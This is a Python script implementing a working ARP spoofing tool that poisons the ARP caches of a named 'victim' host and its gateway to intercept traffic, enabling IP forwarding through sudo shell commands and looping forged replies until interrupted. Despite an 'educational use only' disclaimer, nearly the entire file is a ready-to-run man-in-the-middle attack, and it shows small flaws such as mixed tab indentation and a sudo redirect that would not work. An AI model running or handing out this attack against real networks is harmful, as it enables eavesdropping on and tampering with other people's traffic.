#!/usr/bin/env python

import scapy.all as scapy
import time
import platform
import subprocess

# for printing arguments help and available options for users
import optparse

# We use netifaces module to get the router IP (or the default gateway IP) - This module is supported on
# a great number of OSs: Windows, Linux, MacOS
import netifaces

'''
Description: This tool is part of the ethical hacking toolset. It describes a simple ARP spoofer.
			 This is for educational use ONLY for security purposes.
The usage of ARPSpoofer can be invoked via a -h switch
Requirements: You need to install scapy, netifaces and optparse
          		Eg: 'pip3 install scapy'
          		Use packaged executables for Mac OS, Linux and MS Windows for deployment
Usage: python3 ARPSpoofer.py  or ./ARPSpoofer.py (after making the file executable or 
        better for deployment to change source code and package the app as executables
Enjoy!
'''


def Retrieve_MAC_from_IP(IP):
    arp_request = scapy.ARP()
    arp_request.pdst = IP  # setting the IPfield in Scapy ARP packet to IP
    broadcast = scapy.Ether()
    broadcast.dst = "ff:ff:ff:ff:ff:ff"
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    return answered_list[0][1].hwsrc


def Retrive_Default_Gateway_IP():
    MyNetworkInterfaces = netifaces.interfaces()
    gws = netifaces.gateways()
    default_gateway = gws['default'][netifaces.AF_INET][0]
    return default_gateway


def ARPspoof(targetIP, PretendIP):
    # PretendIP is what we are spoofing
    MAC_target = Retrieve_MAC_from_IP(targetIP)  # MAC address of target computer retrieved from IP

    packet = scapy.ARP(op=2, pdst=targetIP, hwdst=MAC_target, psrc=PretendIP)
    scapy.send(packet, verbose=False)


def RestoreARPTable(DestinationIP, SourceIP):
    DestinationMAC = Retrieve_MAC_from_IP(DestinationIP)
    SourceMAC = Retrieve_MAC_from_IP(SourceIP)
    packet = scapy.ARP(op=2, pdst=DestinationIP, hwdst=DestinationMAC, psrc=SourceIP, hwsrc=SourceMAC)
    scapy.send(packet, count=6, verbose=False)


def main():
    parser = optparse.OptionParser(
        'Usage of the program: ' + '-t <target IP>' + ' -s <spoof IP>\n' + 'Please press Ctrl + C to end')
    parser.add_option('-t', '--target', dest='targetIP', type='string',
                      help='specify a target IP, this would usually be a victim IP)')
    parser.add_option('-s', '--spoof', dest='spoofIP', type='string',
                      help='specify a spoof IP or a pretend IP, this would usually be a router IP)')

    (options, args) = parser.parse_args()
    targetIP = options.targetIP  # taking the victim IP
    spoofIP = options.spoofIP  # taking the gateway IP or router IP

    if (options.targetIP == None):
        parser.print_help()
        exit(0)

    if (options.spoofIP == None):
        print("You did not specify a Spoof IP corresponding to a gateway. I will try to find your router/gateway IP for you.")

        spoofIP = Retrive_Default_Gateway_IP()
        print("Gateway IP: " + spoofIP)

    # checking what OS you are running
    print('\nDetecting what Operating System you are using...')
    if (platform.system() == 'Windows'):
        print('\nYou appear to be on MS Windows machine')
        input("Please enable IP forwarding and then press Enter to continue...")
    elif (platform.system() == 'Linux'):
        print('\nYou appear to be on Linux machine. Enabling IP forwarding (sudo privileges needed)...')
        subprocess.run("sudo echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True, check=True)
    elif (platform.system() == 'Darwin'):
        # you are on a Mac OS
        print('\nYou appear to be on MacOS machine. Enabling IP forwarding (sudo privileges needed)...')
	subprocess.run("sudo sysctl -w net.inet.ip.forwarding=1", shell=True, check=True)        
    else:
        print('\nUnknown OS...')
        input("Please enable IP forwarding manually and then press Enter to continue...")

    # How the spoof occur?!
    # Loop the sending of packets so that the arp table does not return to normality (we need to sleep a bit so not to flood the network)
    Nb_packets_sent = 0

    try:
        while True:
            # Spoofing the client: 1) telling the victim that I am the router... SpoofIP here is the gateway or router IP
            ARPspoof(targetIP, spoofIP)
            # Spoofing the router: 2) telling the router that I am the victim machine...
            ARPspoof(spoofIP, targetIP)
            Nb_packets_sent += 2
            print("\rPackets sent: " + str(Nb_packets_sent), end="")
            time.sleep(3)
    except KeyboardInterrupt:
        RestoreARPTable(targetIP, spoofIP)
        RestoreARPTable(spoofIP, targetIP)
        exit(0)

# Retrive_Default_Gateway_IP()  # 172.18.47.254

if __name__ == '__main__':
    main()
